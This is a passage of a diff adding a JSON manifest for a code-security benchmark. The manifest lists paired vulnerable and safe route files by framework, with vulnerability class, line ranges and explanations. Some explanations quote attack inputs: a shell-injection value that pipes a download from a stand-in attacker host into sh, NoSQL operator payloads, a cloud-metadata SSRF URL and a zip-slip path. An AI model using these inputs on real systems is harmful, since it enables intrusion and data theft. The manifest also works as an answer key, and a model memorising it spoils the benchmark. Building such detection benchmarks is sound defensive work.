@@ -1,0 +1,2485 @@
+{
+  "generatedBy": "benchmark/build-corpus-manifest.mjs",
+  "families": [
+    {
+      "family": "express",
+      "architecture": "Express 4 router modules with middleware authentication, a pg pool or Knex query builder for persistence, and res.json responses",
+      "vulnerable": 11,
+      "safe": 11
+    },
+    {
+      "family": "fastify",
+      "architecture": "Fastify 4 plugin modules exporting `async function (fastify, options)`, with preHandler authentication decorators, JSON schema validation, @fastify/multipart uploads, @fastify/cookie sessions, and MongoDB collections or a Postgres pool for storage",
+      "vulnerable": 10,
+      "safe": 10
+    },
+    {
+      "family": "graphql",
+      "architecture": "Apollo Server 4 with graphql-js executable schemas: gql-tagged typeDefs per module, a resolvers object of Query/Mutation/type maps taking (parent, args, context) where context.viewer is the authenticated subject, Prisma for relational reads and the Mongo driver for the search collections",
+      "vulnerable": 6,
+      "safe": 6
+    },
+    {
+      "family": "hono",
+      "architecture": "Hono 4 route modules in TypeScript, mounted with app.use middleware for session handling, reading input through c.req.param/query/json, persisting through a Prisma client or a pg pool, and answering with c.json, c.html or a raw Response",
+      "vulnerable": 6,
+      "safe": 6
+    },
+    {
+      "family": "koa",
+      "architecture": "Koa 2 applications in CommonJS JavaScript with @koa/router routers mounted under a prefix, per-route requireUser middleware and composed async middleware using await next(), reading ctx.params/ctx.query/ctx.request.body, a pg pool for persistence, and ctx.body / ctx.throw for responses",
+      "vulnerable": 6,
+      "safe": 6
+    },
+    {
+      "family": "nextjs-app-router",
+      "architecture": "Next.js 15/16 App Router route handlers and async React server components in TypeScript, with cookie sessions read through await cookies() and Drizzle ORM for data access",
+      "vulnerable": 11,
+      "safe": 11
+    },
+    {
+      "family": "nextjs-server-actions",
+      "architecture": "Next.js 15/16 \"use server\" action modules under app/actions, invoked from client components through form actions, with cookie sessions read through await cookies() and Drizzle ORM for writes",
+      "vulnerable": 6,
+      "safe": 6
+    },
+    {
+      "family": "plain-http",
+      "architecture": "Hand-rolled Node 20 node:http server: http.createServer with an async request handler, a manual dispatcher over `${request.method} ${url.pathname}`, manual body reading and hand-written JSON responses (CommonJS, no framework).",
+      "vulnerable": 11,
+      "safe": 11
+    },
+    {
+      "family": "python-fastapi",
+      "architecture": "FastAPI APIRouter modules with async path operations, SQLAlchemy 2.0 Session injected through Depends(get_session), the authenticated subject through Depends(get_current_user), Pydantic v2 request and response models, and HTTPException for error responses",
+      "vulnerable": 5,
+      "safe": 5
+    },
+    {
+      "family": "trpc",
+      "architecture": "tRPC 11 routers in TypeScript composed with router({ ... }), publicProcedure and protectedProcedure, Zod input schemas, a Prisma client and the session on ctx, and TRPCError for failures — procedures are addressed by dotted procedure path rather than by HTTP method and path",
+      "vulnerable": 6,
+      "safe": 6
+    }
+  ],
+  "totals": {
+    "vulnerable": 78,
+    "safe": 78,
+    "classes": 38
+  },
+  "classes": [
+    "argument_injection",
+    "broken_function_level_authorization",
+    "broken_object_level_authorization",
+    "business_logic_price_manipulation",
+    "code_injection",
+    "command_injection",
+    "debug_endpoint_exposure",
+    "hardcoded_secret",
+    "insecure_cookie_configuration",
+    "insecure_cors_configuration",
+    "insecure_randomness",
+    "jwt_verification_bypass",
+    "mass_assignment",
+    "missing_authentication",
+    "missing_csrf_protection",
+    "missing_rate_limit_on_credentials",
+    "nosql_injection",
+    "open_redirect",
+    "path_traversal",
+    "prototype_pollution",
+    "race_condition_double_spend",
+    "reflected_cross_site_scripting",
+    "secret_exposed_to_client_bundle",
+    "sensitive_data_in_logs",
+    "server_side_request_forgery",
+    "sql_injection",
+    "stored_cross_site_scripting",
+    "template_injection",
+    "timing_unsafe_comparison",
+    "unbounded_resource_consumption",
+    "unrestricted_file_upload",
+    "unsafe_deserialization",
+    "unsafe_query_composition",
+    "verbose_error_response",
+    "weak_password_hashing",
+    "weak_session_identifier",
+    "xml_external_entity",
+    "zip_slip"
+  ],
+  "cases": [
+    {
+      "id": "express-invoice-ledger-filter",
+      "family": "express",
+      "architecture": "Express 4 router modules with middleware authentication, a pg pool or Knex query builder for persistence, and res.json responses",
+      "language": "javascript",
+      "file": "express/invoice-search.js",
+      "kind": "vulnerable",
+      "category": "sql_injection",
+      "severityBand": [
+        "high",
+        "critical"
+      ],
+      "route": "GET /invoices/search",
+      "line": 35,
+      "lineRange": [
+        35,
+        59
+      ],
+      "runtimeVerifiable": true,
+      "why": "Every other filter is bound as a placeholder, but the status filter is spliced into the WHERE clause as a single-quoted literal, so a status value containing a quote closes the literal and appends attacker-chosen SQL to the statement that pool.query executes."
+    },
+    {
+      "id": "express-payout-ledger-filter",
+      "family": "express",
+      "language": "javascript",
+      "file": "express/payout-search.js",
+      "kind": "safe",
+      "pairedWith": "express-invoice-ledger-filter",
+      "why": "The same filter surface, but every caller-supplied value — state, destination, cutoff, limit and offset — is bound as a numbered placeholder, and the only interpolated fragments are the sort column and direction resolved through a fixed map and a two-way ternary, so no request text reaches the statement text."
+    },
+    {
+      "id": "express-project-archive-build",
+      "family": "express",
+      "architecture": "Express 4 router modules with middleware authentication, a pg pool or Knex query builder for persistence, and res.json responses",
+      "language": "javascript",
+      "file": "express/project-export.js",
+      "kind": "vulnerable",
+      "category": "command_injection",
+      "severityBand": [
+        "high",
+        "critical"
+      ],
+      "route": "POST /projects/:projectId/exports",
+      "line": 40,
+      "lineRange": [
+        36,
+        42
+      ],
+      "runtimeVerifiable": true,
+      "why": "The request body's label is interpolated into the archive name and then into a string handed to child_process.exec, which runs it through /bin/sh; a label such as \"a; curl attacker.example | sh\" executes as a separate shell command with the application's privileges."
+    },
+    {
+      "id": "express-workspace-archive-build",
+      "family": "express",
+      "language": "javascript",
+      "file": "express/workspace-backup.js",
+      "kind": "safe",
+      "pairedWith": "express-project-archive-build",
+      "why": "The same tar invocation goes through execFile with a fixed argv array, so no shell parses the arguments, and the label is additionally rejected unless it matches a lowercase slug pattern before it ever reaches the file name."
+    },
+    {
+      "id": "express-message-attachment-stream",
+      "family": "express",
+      "architecture": "Express 4 router modules with middleware authentication, a pg pool or Knex query builder for persistence, and res.json responses",
+      "language": "javascript",
+      "file": "express/message-attachment.js",
+      "kind": "vulnerable",
+      "category": "path_traversal",
+      "severityBand": [
+        "high",
+        "critical"
+      ],
+      "route": "GET /messages/:messageId/attachments/:filename",
+      "line": 35,
+      "lineRange": [
+        35,
+        46
+      ],
+      "runtimeVerifiable": true,
+      "why": "The file name arrives from the path parameter and is joined onto the attachment root with no normalisation or containment check, so a value with encoded ../ segments resolves outside the root and the stream returns any file the process can read."
+    },
+    {
+      "id": "express-statement-file-stream",
+      "family": "express",
+      "language": "javascript",
+      "file": "express/statement-download.js",
+      "kind": "safe",
+      "pairedWith": "express-message-attachment-stream",
+      "why": "The same path-parameter file name is reduced to its basename, resolved against the statement root, and then rejected with a 400 unless the resolved path still sits under that root, so traversal segments cannot escape the directory."
+    },
+    {
+      "id": "express-order-detail-lookup",
+      "family": "express",
+      "architecture": "Express 4 router modules with middleware authentication, a pg pool or Knex query builder for persistence, and res.json responses",
+      "language": "javascript",
+      "file": "express/order-detail.js",
+      "kind": "vulnerable",
+      "category": "broken_object_level_authorization",
+      "severityBand": [
+        "high",
+        "critical"
+      ],
+      "route": "GET /orders/:orderId",
+      "line": 38,
+      "lineRange": [
+        34,
+        40
+      ],
+      "runtimeVerifiable": true,
+      "why": "The list route above scopes on account_id, but the detail route resolves the order from the path parameter alone; any signed-in user who guesses or enumerates an id receives another account's order, including billing email and shipping address."
+    },
+    {
+      "id": "express-shipment-detail-lookup",
+      "family": "express",
+      "language": "javascript",
+      "file": "express/shipment-detail.js",
+      "kind": "safe",
+      "pairedWith": "express-order-detail-lookup",
+      "why": "The detail query carries the authenticated account alongside the path parameter in the WHERE clause and returns 404 when nothing matches, so a shipment belonging to another account is indistinguishable from one that does not exist."
+    },
+    {
+      "id": "express-team-member-patch",
+      "family": "express",
+      "architecture": "Express 4 router modules with middleware authentication, a pg pool or Knex query builder for persistence, and res.json responses",
+      "language": "javascript",
+      "file": "express/team-member-update.js",
+      "kind": "vulnerable",
+      "category": "mass_assignment",
+      "severityBand": [
+        "medium",
+        "high"
+      ],
+      "route": "PATCH /teams/:teamId/members/:memberId",
+      "line": 20,
+      "lineRange": [
+        20,
+        32
+      ],
+      "runtimeVerifiable": true,
+      "why": "The whole request body is spread into the Knex update; only id, team_id and created_at are stripped, so a caller can also send role or seat_type — columns the people form never exposes — and promote a member or hand out a paid seat."
+    },
+    {
+      "id": "express-directory-entry-patch",
+      "family": "express",
+      "language": "javascript",
+      "file": "express/directory-profile-update.js",
+      "kind": "safe",
+      "pairedWith": "express-team-member-patch",
+      "why": "The update object is assembled field by field from named body properties, each type-checked and the seat type validated against a fixed set, so any extra property in the payload is simply never copied into the row."
+    },
+    {
+      "id": "express-widget-embed-origins",
+      "family": "express",
+      "architecture": "Express 4 router modules with middleware authentication, a pg pool or Knex query builder for persistence, and res.json responses",
+      "language": "javascript",
+      "file": "express/embed-headers.js",
+      "kind": "vulnerable",
+      "category": "insecure_cors_configuration",
+      "severityBand": [
+        "medium",
+        "high"
+      ],
+      "route": "GET /embed/session",
+      "line": 15,
+      "lineRange": [
+        14,
+        17
+      ],
+      "runtimeVerifiable": true,
+      "why": "The middleware echoes whatever Origin the request carried back as Access-Control-Allow-Origin and pairs it with Allow-Credentials: true, so any site a signed-in shopper visits can read the credentialed session and cart response cross-origin."
+    },
+    {
+      "id": "express-partner-portal-origins",
+      "family": "express",
+      "language": "javascript",
+      "file": "express/partner-api-headers.js",
+      "kind": "safe",
+      "pairedWith": "express-widget-embed-origins",
+      "why": "The origin is echoed only after a membership test against a configured allowlist, and the response varies on Origin, so an unregistered site receives no cross-origin permission at all despite the header being reflected for the allowed ones."
+    },
+    {
+      "id": "express-contact-import-failure",
+      "family": "express",
+      "architecture": "Express 4 router modules with middleware authentication, a pg pool or Knex query builder for persistence, and res.json responses",
+      "language": "javascript",
+      "file": "express/import-jobs.js",
+      "kind": "vulnerable",
+      "category": "verbose_error_response",
+      "severityBand": [
+        "low",
+        "medium"
+      ],
+      "route": "POST /imports/contacts",
+      "line": 46,
+      "lineRange": [
+        46,
+        52
+      ],
+      "runtimeVerifiable": true,
+      "why": "The failure response hands the client the driver's message and detail, the failing SQL statement and the full stack trace, which discloses table and column names, absolute source paths and dependency layout to anyone who can make the import fail."
+    },
+    {
+      "id": "express-contact-export-failure",
+      "family": "express",
+      "language": "javascript",
+      "file": "express/export-jobs.js",
+      "kind": "safe",
+      "pairedWith": "express-contact-import-failure",
+      "why": "The same catch block logs the error object server-side with a generated trace id and returns only a fixed sentence plus that id, so the client learns nothing about the query, the schema or the stack."
+    },
+    {
+      "id": "express-sign-in-return-path",
+      "family": "express",
+      "architecture": "Express 4 router modules with middleware authentication, a pg pool or Knex query builder for persistence, and res.json responses",
+      "language": "javascript",
+      "file": "express/session-start.js",
+      "kind": "vulnerable",
+      "category": "open_redirect",
+      "severityBand": [
+        "low",
+        "medium"
+      ],
+      "route": "POST /session",
+      "line": 42,
+      "lineRange": [
+        17,
+        42
+      ],
+      "runtimeVerifiable": true,
+      "why": "The post-sign-in destination is taken straight from the request's next parameter and passed to res.redirect with no check that it is a local path, so a crafted sign-in link sends the freshly authenticated visitor to an absolute attacker URL that looks like it came from the application."
+    },
+    {
+      "id": "express-sso-return-path",
+      "family": "express",
+      "language": "javascript",
+      "file": "express/sso-return.js",
+      "kind": "safe",
+      "pairedWith": "express-sign-in-return-path",
+      "why": "The destination passes through a helper that requires a single leading slash and rejects protocol-relative and backslash-escaped forms, falling back to the dashboard, so only a same-origin path can be reached by redirect."
+    },
+    {
+      "id": "express-self-serve-signup",
+      "family": "express",
+      "architecture": "Express 4 router modules with middleware authentication, a pg pool or Knex query builder for persistence, and res.json responses",
+      "language": "javascript",
+      "file": "express/account-signup.js",
+      "kind": "vulnerable",
+      "category": "weak_password_hashing",
+      "severityBand": [
+        "medium",
+        "high"
+      ],
+      "route": "POST /accounts",
+      "line": 35,
+      "lineRange": [
+        35,
+        47
+      ],
+      "runtimeVerifiable": false,
+      "why": "The stored credential is a bare SHA-256 digest of the password: no salt, no work factor, so a leaked users table is recoverable at billions of guesses per second and identical passwords collide across accounts."
+    },
+    {
+      "id": "express-invite-password-set",
+      "family": "express",
+      "language": "javascript",
+      "file": "express/invite-accept.js",
+      "kind": "safe",
+      "pairedWith": "express-self-serve-signup",
+      "why": "The password is put through argon2id with an explicit memory cost, time cost and parallelism, which produces a salted, deliberately slow digest, so the stored value resists offline cracking."
+    },
+    {
+      "id": "express-integration-key-check",
+      "family": "express",
+      "architecture": "Express 4 router modules with middleware authentication, a pg pool or Knex query builder for persistence, and res.json responses",
+      "language": "javascript",
+      "file": "express/integration-auth.js",
+      "kind": "vulnerable",
+      "category": "timing_unsafe_comparison",
+      "severityBand": [
+        "medium",
+        "high"
+      ],
+      "route": "GET /integrations/whoami",
+      "line": 32,
+      "lineRange": [
+        27,
+        35
+      ],
+      "runtimeVerifiable": false,
+      "why": "The secret half of the API key is compared with !==, which short-circuits at the first differing byte; the response time therefore leaks how much of the secret was correct, letting a caller who knows a key id recover the secret byte by byte."
+    },
+    {
+      "id": "express-service-token-check",
+      "family": "express",
+      "language": "javascript",
+      "file": "express/service-token-auth.js",
+      "kind": "safe",
+      "pairedWith": "express-integration-key-check",
+      "why": "The presented secret is compared with crypto.timingSafeEqual after an explicit length check, so the comparison takes the same time regardless of how many bytes match and reveals nothing about the stored value."
+    },
+    {
+      "id": "express-operations-log-query",
+      "family": "express",
+      "architecture": "Express 4 router modules with middleware authentication, a pg pool or Knex query builder for persistence, and res.json responses",
+      "language": "javascript",
+      "file": "express/log-search.js",
+      "kind": "vulnerable",
+      "category": "argument_injection",
+      "severityBand": [
+        "medium",
+        "high"
+      ],
+      "route": "GET /operations/logs",
+      "line": 42,
+      "lineRange": [
+        40,
+        44
+      ],
+      "runtimeVerifiable": true,
+      "why": "The executable is fixed and there is no shell, but the search term occupies a positional argv slot with no -- separator and no leading-dash check, so a term beginning with a dash is parsed by ripgrep as an option: --pre=<program> makes it run that program over every file, and -f<path> turns the search into a read of an arbitrary file."
+    },
+    {
+      "id": "express-audit-log-query",
+      "family": "express",
+      "language": "javascript",
+      "file": "express/audit-log-search.js",
+      "kind": "safe",
+      "pairedWith": "express-operations-log-query",
+      "why": "The same ripgrep call passes the search term as the value of an explicit --regexp option and terminates option parsing with -- before the search root, so a term beginning with a dash is treated as pattern text and can never become a flag."
+    },
+    {
+      "id": "fastify-password-reset-token-lookup",
+      "family": "fastify",
+      "architecture": "Fastify 4 plugin modules exporting `async function (fastify, options)`, with preHandler authentication decorators, JSON schema validation, @fastify/multipart uploads, @fastify/cookie sessions, and MongoDB collections or a Postgres pool for storage",
+      "language": "javascript",
+      "file": "fastify/password-reset-confirm.js",
+      "kind": "vulnerable",
+      "category": "nosql_injection",
+      "severityBand": [
+        "high",
+        "critical"
+      ],
+      "route": "POST /auth/password-reset/confirm",
+      "line": 58,
+      "lineRange": [
+        53,
+        61
+      ],
+      "runtimeVerifiable": true,
+      "why": "The confirm route registers no body schema, so request.body.email and request.body.token reach the Mongo filter as whatever JSON was posted; a body of {\"email\":\"victim@example.com\",\"token\":{\"$ne\":null}} matches that account's outstanding reset request without knowing the emailed token and the handler then rewrites its password hash."
+    },
+    {
+      "id": "fastify-invitation-token-lookup",
+      "family": "fastify",
+      "language": "javascript",
+      "file": "fastify/invitation-redeem.js",
+      "kind": "safe",
+      "pairedWith": "fastify-password-reset-token-lookup",
+      "why": "The same findOne filter is built from body fields, but the route's JSON schema pins email to a string and the token to a 64-character hex pattern with additionalProperties false, so an operator object is rejected by validation before the query is built, and the fetched token is then compared with timingSafeEqual."
+    },
+    {
+      "id": "fastify-profile-avatar-store",
+      "family": "fastify",
+      "architecture": "Fastify 4 plugin modules exporting `async function (fastify, options)`, with preHandler authentication decorators, JSON schema validation, @fastify/multipart uploads, @fastify/cookie sessions, and MongoDB collections or a Postgres pool for storage",
+      "language": "javascript",
+      "file": "fastify/avatar-upload.js",
+      "kind": "vulnerable",
+      "category": "unrestricted_file_upload",
+      "severityBand": [
+        "high",
+        "critical"
+      ],
+      "route": "POST /profile/avatar",
+      "line": 30,
+      "lineRange": [
+        25,
+        30
+      ],
+      "runtimeVerifiable": true,
+      "why": "Nothing checks the part's content type or content: the extension is taken from the client-supplied filename and the bytes are written unchanged into the publicly served avatar folder, so any authenticated user can host .html or .svg content on the application's own origin and get a stored cross-site scripting payload served back with the site's cookies in scope."
+    },
+    {
+      "id": "fastify-organisation-logo-store",
+      "family": "fastify",
+      "language": "javascript",
+      "file": "fastify/organisation-logo-upload.js",
+      "kind": "safe",
+      "pairedWith": "fastify-profile-avatar-store",
+      "why": "The same multipart-to-public-folder write, but the extension comes from a three-entry mime allowlist rather than the upload's filename, the buffered bytes must carry the matching PNG, JPEG or WebP signature, and anything else is refused with 415 before a file is created."
+    },
+    {
+      "id": "fastify-theme-archive-unpack",
+      "family": "fastify",
+      "architecture": "Fastify 4 plugin modules exporting `async function (fastify, options)`, with preHandler authentication decorators, JSON schema validation, @fastify/multipart uploads, @fastify/cookie sessions, and MongoDB collections or a Postgres pool for storage",
+      "language": "javascript",
+      "file": "fastify/theme-import.js",
+      "kind": "vulnerable",
+      "category": "zip_slip",
+      "severityBand": [
+        "high",
+        "critical"
+      ],
+      "route": "POST /themes/imports",
+      "line": 23,
+      "lineRange": [
+        23,
+        40
+      ],
+      "runtimeVerifiable": true,
+      "why": "Each archive entry's name is joined onto the destination directory and streamed to that path with no containment check, so an entry called ../../../../etc/cron.d/app or one that overwrites a file under the application root escapes the theme directory and is written with the server's privileges."
+    },
+    {
+      "id": "fastify-template-pack-unpack",
+      "family": "fastify",
+      "language": "javascript",
+      "file": "fastify/template-pack-import.js",
+      "kind": "safe",
+      "pairedWith": "fastify-theme-archive-unpack",
+      "why": "The same yauzl entry loop, but every entry name is resolved against the resolved destination root and an entry whose resolved path is not the root or inside root + path.sep is recorded as skipped and never opened, so no write can land outside the pack directory."
+    },
+    {
+      "id": "fastify-workspace-member-role",
+      "family": "fastify",
+      "architecture": "Fastify 4 plugin modules exporting `async function (fastify, options)`, with preHandler authentication decorators, JSON schema validation, @fastify/multipart uploads, @fastify/cookie sessions, and MongoDB collections or a Postgres pool for storage",
+      "language": "javascript",
+      "file": "fastify/workspace-members.js",
+      "kind": "vulnerable",
+      "category": "broken_function_level_authorization",
+      "severityBand": [
+        "high",
+        "critical"
+      ],
+      "route": "PATCH /workspaces/:workspaceId/members/:memberId",
+      "line": 35,
+      "lineRange": [
+        33,
+        45
+      ],
+      "runtimeVerifiable": true,
+      "why": "The role change is gated only on being some member of the workspace, while the sibling delete route in the same file requires the owner role; any viewer can therefore PATCH their own membership row to role \"owner\" and take over the workspace."
+    },
+    {
+      "id": "fastify-project-collaborator-role",
+      "family": "fastify",
+      "language": "javascript",
+      "file": "fastify/project-collaborators.js",
+      "kind": "safe",
+      "pairedWith": "fastify-workspace-member-role",
+      "why": "The identical role-picker update requires the manager role through requireProjectRole on the preHandler chain, the same gate the destructive route uses, so a plain collaborator cannot reach the privileged function at all."
+    },
+    {
+      "id": "fastify-member-session-cookie",
+      "family": "fastify",
+      "architecture": "Fastify 4 plugin modules exporting `async function (fastify, options)`, with preHandler authentication decorators, JSON schema validation, @fastify/multipart uploads, @fastify/cookie sessions, and MongoDB collections or a Postgres pool for storage",
+      "language": "javascript",
+      "file": "fastify/member-sign-in.js",
+      "kind": "vulnerable",
+      "category": "insecure_cookie_configuration",
+      "severityBand": [
+        "medium",
+        "high"
+      ],
+      "route": "POST /sessions",
+      "line": 46,
+      "lineRange": [
+        46,
+        52
+      ],
+      "runtimeVerifiable": true,
+      "why": "The session identifier is set with httpOnly false, secure false and sameSite none, so any script on the page can read it, it is transmitted over plain HTTP, and it is attached to cross-site requests — three independent ways to lose or replay a live session."
+    },
+    {
+      "id": "fastify-operator-session-cookie",
+      "family": "fastify",
+      "language": "javascript",
+      "file": "fastify/operator-sign-in.js",
+      "kind": "safe",
+      "pairedWith": "fastify-member-session-cookie",
+      "why": "The same setCookie call for the same kind of session identifier, but marked httpOnly, secure, sameSite lax and signed, with a bounded maxAge, so the cookie is unreadable from script, never sent in the clear and not attached to cross-site navigations that mutate state."
+    },
+    {
+      "id": "fastify-partner-bearer-claims",
+      "family": "fastify",
+      "architecture": "Fastify 4 plugin modules exporting `async function (fastify, options)`, with preHandler authentication decorators, JSON schema validation, @fastify/multipart uploads, @fastify/cookie sessions, and MongoDB collections or a Postgres pool for storage",
+      "language": "javascript",
+      "file": "fastify/partner-api-auth.js",
+      "kind": "vulnerable",
+      "category": "jwt_verification_bypass",
+      "severityBand": [
+        "high",
+        "critical"
+      ],
+      "route": "GET /partner/orders",
+      "line": 20,
+      "lineRange": [
+        20,
+        37
+      ],
+      "runtimeVerifiable": true,
+      "why": "jwt.decode only parses the token; it never checks the signature, so the issuer, audience, expiry, subject and scope checks that follow all run on attacker-authored claims and anyone can mint a bearer token for any active partner's order feed."
+    },
+    {
+      "id": "fastify-vendor-bearer-claims",
+      "family": "fastify",
+      "language": "javascript",
+      "file": "fastify/vendor-api-auth.js",
+      "kind": "safe",
+      "pairedWith": "fastify-partner-bearer-claims",
+      "why": "The same decorator shape uses jwt.verify against the portal's public key with algorithms pinned to RS256 and the issuer and audience asserted by the library, so claims are only trusted after the signature is checked and a failure returns 401."
+    },
+    {
+      "id": "fastify-password-grant-endpoint",
+      "family": "fastify",
+      "architecture": "Fastify 4 plugin modules exporting `async function (fastify, options)`, with preHandler authentication decorators, JSON schema validation, @fastify/multipart uploads, @fastify/cookie sessions, and MongoDB collections or a Postgres pool for storage",
+      "language": "javascript",
+      "file": "fastify/access-tokens.js",
+      "kind": "vulnerable",
+      "category": "missing_rate_limit_on_credentials",
+      "severityBand": [
+        "medium",
+        "high"
+      ],
+      "route": "POST /auth/tokens",
+      "line": 36,
+      "lineRange": [
+        36,
+        41
+      ],
+      "runtimeVerifiable": true,
+      "why": "@fastify/rate-limit is registered with global false, so only routes carrying a config.rateLimit block are limited; the refresh and revoke routes in this file have one and the password grant does not, leaving credential guessing against it unthrottled."
+    },
+    {
+      "id": "fastify-login-code-endpoint",
+      "family": "fastify",
+      "language": "javascript",
+      "file": "fastify/login-challenge.js",
+      "kind": "safe",
+      "pairedWith": "fastify-password-grant-endpoint",
+      "why": "Both credential routes carry their own config.rateLimit with a keyGenerator that combines request.ip with the submitted account address, so neither issuing nor redeeming a login code can be brute forced from one address or against one account."
+    },
+    {
+      "id": "fastify-payment-method-intake",
+      "family": "fastify",
+      "architecture": "Fastify 4 plugin modules exporting `async function (fastify, options)`, with preHandler authentication decorators, JSON schema validation, @fastify/multipart uploads, @fastify/cookie sessions, and MongoDB collections or a Postgres pool for storage",
+      "language": "javascript",
+      "file": "fastify/payment-method-registration.js",
+      "kind": "vulnerable",
+      "category": "sensitive_data_in_logs",
+      "severityBand": [
+        "medium",
+        "high"
+      ],
+      "route": "POST /billing/payment-methods",
+      "line": 34,
+      "lineRange": [
+        33,
+        36
+      ],
+      "runtimeVerifiable": true,
+      "why": "The whole request body is written to the request logger, and that body is the card intake form: the full primary account number, expiry and security code end up in application logs and anywhere they are shipped, which is exactly the data the tokenisation call exists to keep out of this system."
+    },
+    {
+      "id": "fastify-payout-account-intake",
+      "family": "fastify",
+      "language": "javascript",
+      "file": "fastify/payout-account-registration.js",
+      "kind": "safe",
+      "pairedWith": "fastify-payment-method-intake",
+      "why": "The same intake route logs a correlation id plus named non-sensitive fields — account id, country and the last four digits of the IBAN — and never the full account identifier or the request body object."
+    },
+    {
+      "id": "fastify-link-card-fetch",
+      "family": "fastify",
+      "architecture": "Fastify 4 plugin modules exporting `async function (fastify, options)`, with preHandler authentication decorators, JSON schema validation, @fastify/multipart uploads, @fastify/cookie sessions, and MongoDB collections or a Postgres pool for storage",
+      "language": "javascript",
+      "file": "fastify/link-preview.js",
+      "kind": "vulnerable",
+      "category": "server_side_request_forgery",
+      "severityBand": [
+        "high",
+        "critical"
+      ],
+      "route": "POST /link-previews",
+      "line": 47,
+      "lineRange": [
+        40,
+        51
+      ],
+      "runtimeVerifiable": true,
+      "why": "The request body's URL is fetched by the server with redirects followed, and only its shape is validated by the schema's uri format, so a caller can point it at http://169.254.169.254/latest/meta-data/ or an internal admin host and read the response through the returned preview fields."
+    },
+    {
+      "id": "fastify-embed-card-fetch",
+      "family": "fastify",
+      "language": "javascript",
+      "file": "fastify/oembed-preview.js",
+      "kind": "safe",
+      "pairedWith": "fastify-link-card-fetch",
+      "why": "The submitted URL is never fetched: it is parsed, required to be https, and looked up in a fixed map of four provider hostnames, and the outbound request goes to that provider's own oEmbed endpoint with redirects set to error, so the caller cannot choose the host the server contacts."
+    },
+    {
+      "id": "fastify-notification-preferences-save",
+      "family": "fastify",
+      "architecture": "Fastify 4 plugin modules exporting `async function (fastify, options)`, with preHandler authentication decorators, JSON schema validation, @fastify/multipart uploads, @fastify/cookie sessions, and MongoDB collections or a Postgres pool for storage",
+      "language": "javascript",
+      "file": "fastify/notification-preferences.js",
+      "kind": "vulnerable",
+      "category": "missing_authentication",
+      "severityBand": [
+        "high",
+        "critical"
+      ],
+      "route": "PUT /users/:userId/notification-preferences",
+      "line": 42,
+      "lineRange": [
+        40,
+        55
+      ],
+      "runtimeVerifiable": true,
+      "why": "The route options carry a body schema but no preHandler, while the sibling read and reset routes both run authenticate and requireSelf; an unauthenticated caller can therefore upsert any user id's notification row, for instance switching every channel off to silence that account's security alerts."
+    },
+    {
+      "id": "fastify-communication-preferences-save",
+      "family": "fastify",
+      "language": "javascript",
+      "file": "fastify/communication-preferences.js",
+      "kind": "safe",
+      "pairedWith": "fastify-notification-preferences-save",
+      "why": "Every route in the file, the write included, runs authenticate and requireSelf in its preHandler chain and keys the statement on request.user.accountId rather than the path parameter, so an anonymous or third-party caller cannot reach the record."
+    },
+    {
+      "id": "graphql-invoice-drawer-lookup",
+      "family": "graphql",
+      "architecture": "Apollo Server 4 with graphql-js executable schemas: gql-tagged typeDefs per module, a resolvers object of Query/Mutation/type maps taking (parent, args, context) where context.viewer is the authenticated subject, Prisma for relational reads and the Mongo driver for the search collections",
+      "language": "javascript",
+      "file": "graphql/invoice-resolvers.js",
+      "kind": "vulnerable",
+      "category": "broken_object_level_authorization",
+      "severityBand": [
+        "high",
+        "critical"
+      ],
+      "route": "POST /graphql",
+      "line": 67,
+      "lineRange": [
+        64,
+        69
+      ],
+      "runtimeVerifiable": true,
+      "why": "The `invoice(id:)` query resolves the record from the client-supplied id alone: requireViewer only proves someone is signed in, and viewer.accountId — which the sibling `invoices` resolver two lines above does put in the WHERE clause — never reaches this findUnique, so any authenticated user can read any account's invoice, billing email and line items by guessing or replaying an id."
+    },
+    {
+      "id": "graphql-statement-drawer-lookup",
+      "family": "graphql",
+      "language": "javascript",
+      "file": "graphql/statement-resolvers.js",
+      "kind": "safe",
+      "pairedWith": "graphql-invoice-drawer-lookup",
+      "why": "The single-record query uses findFirst with both the requested id and the viewer's accountId in the where clause, so a statement belonging to another account resolves to null and is reported as not found rather than returned."
+    },
+    {
+      "id": "graphql-member-role-dropdown",
+      "family": "graphql",
+      "architecture": "Apollo Server 4 with graphql-js executable schemas: gql-tagged typeDefs per module, a resolvers object of Query/Mutation/type maps taking (parent, args, context) where context.viewer is the authenticated subject, Prisma for relational reads and the Mongo driver for the search collections",
+      "language": "javascript",
+      "file": "graphql/member-role-resolvers.js",
+      "kind": "vulnerable",
+      "category": "broken_function_level_authorization",
+      "severityBand": [
+        "high",
+        "critical"
+      ],
+      "route": "POST /graphql",
+      "line": 54,
+      "lineRange": [
+        54,
+        69
+      ],
+      "runtimeVerifiable": true,
+      "why": "The `updateMemberRole` mutation writes any WorkspaceRole — including OWNER — for any workspace and any user after checking only that the caller is signed in; it never calls the assertOwner helper that the transferWorkspaceOwnership mutation in the same file uses, so any authenticated account can promote itself to owner of a workspace it does not belong to."
+    },
+    {
+      "id": "graphql-workspace-plan-picker",
+      "family": "graphql",
+      "language": "javascript",
+      "file": "graphql/plan-change-resolvers.js",
+      "kind": "safe",
+      "pairedWith": "graphql-member-role-dropdown",
+      "why": "The privileged mutation resolves the caller's own membership row for the target workspace and rejects the request with FORBIDDEN unless that row carries OWNER or ADMIN, so authentication alone does not authorise the plan change."
+    },
+    {
+      "id": "graphql-library-facet-search",
+      "family": "graphql",
+      "architecture": "Apollo Server 4 with graphql-js executable schemas: gql-tagged typeDefs per module, a resolvers object of Query/Mutation/type maps taking (parent, args, context) where context.viewer is the authenticated subject, Prisma for relational reads and the Mongo driver for the search collections",
+      "language": "javascript",
+      "file": "graphql/document-search-resolvers.js",
+      "kind": "vulnerable",
+      "category": "nosql_injection",
+      "severityBand": [
+        "high",
+        "critical"
+      ],
+      "route": "POST /graphql",
+      "line": 61,
+      "lineRange": [
+        58,
+        66
+      ],
+      "runtimeVerifiable": true,
+      "why": "`filter` arrives as a JSON scalar and is spread whole into the object handed to collection.find and countDocuments, so the client controls query operators rather than values: a filter of {\"ownerEmail\": {\"$ne\": null}} or {\"$where\": \"sleep(5000)\"} changes the query's meaning, and because the spread comes last it also overwrites the workspaceId and deletedAt keys that scope the search to the caller's tenant."
+    },
+    {
+      "id": "graphql-notes-facet-search",
+      "family": "graphql",
+      "language": "javascript",
+      "file": "graphql/note-search-resolvers.js",
+      "kind": "safe",
+      "pairedWith": "graphql-library-facet-search",
+      "why": "The same JSON facet payload is projected through buildFacetQuery, which reads only the four known facet keys, rejects any value that is not a string or number, and coerces what it keeps with String(), so no client-supplied object can become a Mongo operator; the tenant scope is applied after the facets and cannot be overwritten."
+    },
+    {
+      "id": "graphql-account-profile-patch",
+      "family": "graphql",
